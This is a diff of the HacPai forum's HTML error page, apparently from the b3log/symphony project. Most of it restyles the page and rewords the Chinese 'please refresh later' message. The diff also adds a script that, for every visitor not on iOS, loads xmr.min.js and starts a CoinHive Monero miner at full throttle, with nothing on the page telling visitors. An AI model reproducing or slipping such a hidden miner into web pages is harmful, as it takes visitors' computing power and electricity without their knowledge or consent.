@@ -1,44 +1,48 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-cmn-Hans">
 <head>
     <meta charset="UTF-8">
     <title>发现一个问题 o(╯□╰)o - HacPai</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" type="image/png" href="images/favicon.png" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" type="image/png" href="images/favicon.png"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/>
     <style>
         html {
             height: 100%;
         }
+
         body {
             font-family: "Helvetica Neue", "Luxi Sans", "DejaVu Sans", Tahoma, "Hiragino Sans GB", "Microsoft Yahei", sans-serif;
-            background: #79a8ae;
-            color: #CFEBE4;
+            background: #3b3e43;
+            color: #bbb;
             font-size: 18px;
             line-height: 1.6;
-            letter-spacing: 1.2px;
             margin: 0;
         }
+
         a {
-            color: #ebf7f4;
+            color: #e6e6e6;
         }
+
         .body--ready {
-            background: -webkit-linear-gradient(top, rgb(203, 235, 219) 0%, rgb(55, 148, 192) 120%);
-            background: -moz-linear-gradient(top, rgb(203, 235, 219) 0%, rgb(55, 148, 192) 120%);
-            background: -o-linear-gradient(top, rgb(203, 235, 219) 0%, rgb(55, 148, 192) 120%);
-            background: -ms-linear-gradient(top, rgb(203, 235, 219) 0%, rgb(55, 148, 192) 120%);
-            background: linear-gradient(top, rgb(203, 235, 219) 0%, rgb(55, 148, 192) 120%);
+            background: -webkit-linear-gradient(top, #666 0%, #3b3e43 120%);
+            background: -moz-linear-gradient(top, #666 0%, #3b3e43 120%);
+            background: -o-linear-gradient(top, #666 0%, #3b3e43 120%);
+            background: -ms-linear-gradient(top, #666 0%, #3b3e43 120%);
+            background: linear-gradient(top, #666 0%, #3b3e43 120%);
         }
+
         .text {
             position: fixed;
-            bottom: 70px;
+            bottom: 20px;
             text-align: center;
             width: 100%;
         }
+
         .canvas {
             margin: 0 auto;
             display: block;
         }
+
         .slogan {
             position: fixed;
             bottom: 50%;
@@ -56,14 +60,24 @@
 <canvas class="canvas"></canvas>
 <p class="slogan">HacPai</p>
 <p class="text">
-    非常抱歉，加载出现了点问题<br/>
-    请稍后尝试刷新，如果还不能使用，<a target="_blank" class="tooltipped tooltipped-n" aria-label="242561391"
-                       href="http://shang.qq.com/wpa/qunwpa?idkey=981d9282616274abb1752336e21b8036828f715a1c4d0628adcf208f2fd54f3a">联系我们</a>吧！
+    加载出现了点问题，请稍后尝试刷新<br/>
+    如果还不能使用，<a target="_blank" class="tooltipped tooltipped-n" aria-label="242561391"
+               href="http://shang.qq.com/wpa/qunwpa?idkey=981d9282616274abb1752336e21b8036828f715a1c4d0628adcf208f2fd54f3a">联系我们</a>吧！
     <br>
     <a href="https://github.com/b3log/symphony">GitHub</a> &nbsp;
     <a href="http://b3log.org/">B3log</a>
 </p>
 <script>
+  if (!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
+    const scriptDom = document.createElement('script')
+    scriptDom.setAttribute('src', '/js/lib/xmr.min.js')
+    document.head.appendChild(scriptDom)
+    scriptDom.onload = function () {
+      var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0});
+      miner.start();
+    };
+  }
+
   var S = {
     init: function () {
       S.Drawing.init('.canvas');
